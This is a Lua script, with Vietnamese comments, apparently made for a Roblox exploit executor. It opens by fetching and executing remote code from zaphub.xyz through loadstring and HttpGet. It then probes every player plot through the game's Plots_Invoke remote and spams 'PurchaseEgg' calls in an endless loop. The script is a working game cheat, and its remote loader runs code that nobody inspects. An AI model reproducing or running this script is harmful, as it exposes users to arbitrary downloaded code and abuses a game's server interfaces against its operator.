script_key="TdVwhWpohFRGWfEVbDSwgRifLiopOLOG";
loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
-- CONFIG
local DELAY_BETWEEN_SCAN_CALLS = 0.1   -- giây giữa mỗi call khi quét các plot
local DELAY_BETWEEN_PURCHASES = 0.1    -- giây giữa mỗi lần spam mua trên plot tìm được
local STOP_ON_FIRST_FOUND = true       -- dừng quét ngay khi tìm plot khả dụng
local PRINT_VERBOSE = true             -- in log chi tiết

-- SERVICES / PATHS
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local PlotsFolder = workspace:WaitForChild("__THINGS"):WaitForChild("Plots")
local Plots_Invoke = ReplicatedStorage:WaitForChild("Network"):WaitForChild("Plots_Invoke")

local LocalPlayer = Players.LocalPlayer

-- helper: kiểm tra phản hồi server có hợp lệ hay không
local function isValidResponse(res, ok)
    if not ok then
        return false
    end
    if res == nil or res == false then
        return false
    end
    return true
end

-- scan tất cả plot hiện có trong workspace.__THINGS.Plots
local function scanPlotsAndFindMine()
    if PRINT_VERBOSE then print("🔍 Bắt đầu quét các plot trong workspace.__THINGS.Plots ...") end

    for _, plot in ipairs(PlotsFolder:GetChildren()) do
        local plotId = plot:GetAttribute("ID") or plot:GetAttribute("PlotID") or tonumber(plot.Name) or plot.Name
        local idNum = tonumber(plotId) or plotId

        if PRINT_VERBOSE then print(("  - Thử plot %s"):format(tostring(idNum))) end

        local args = {
            idNum,
            "PurchaseEgg",
            1,
            3
        }

        local ok, res = pcall(function()
            return Plots_Invoke:InvokeServer(unpack(args))
        end)

        if isValidResponse(res, ok) then
            print(("✅ Plot khả dụng phát hiện: %s  | Resp: %s"):format(tostring(idNum), tostring(res)))
            return idNum
        else
            if PRINT_VERBOSE then
                print(("   ✖ Không phải plot của bạn: %s  | ok=%s res=%s"):format(tostring(idNum), tostring(ok), tostring(res)))
            end
        end

        task.wait(DELAY_BETWEEN_SCAN_CALLS)
    end

    print("🔎 Quét xong, không tìm được plot khả dụng.")
    return nil
end

-- spam mua liên tục cho plotId đã tìm được
local function spamPurchase(plotId)
    if not plotId then return end
    print(("🚀 Bắt đầu spam mua trứng 1–3 cho plot %s (delay %ss) — dừng bằng cách thoát script"):format(
        tostring(plotId), tostring(DELAY_BETWEEN_PURCHASES)
    ))

    while true do
        -- 🥚 Lặp qua từng trứng: House1 (1), House2 (2), House3 (3)
        for eggSlot = 1, 3 do
            local args = { plotId, "PurchaseEgg", eggSlot, 3 }

            local ok, res = pcall(function()
                return Plots_Invoke:InvokeServer(unpack(args))
            end)

            if ok then
                print(("✅ Mua thành công trứng #%d (resp=%s) tại plot %s"):format(eggSlot, tostring(res), tostring(plotId)))
            else
                warn(("⚠️ Lỗi khi mua trứng #%d tại plot %s -> %s"):format(eggSlot, tostring(plotId), tostring(res)))
            end

            task.wait(DELAY_BETWEEN_PURCHASES)
        end
    end
end


-- MAIN
task.spawn(function()
    local foundPlot = scanPlotsAndFindMine()
    if not foundPlot then
        print("❗ Không tìm thấy plot khả dụng. Bạn có thể thử tăng delay hoặc kiểm tra logic phản hồi.")
        return
    end

    spamPurchase(foundPlot)
end)
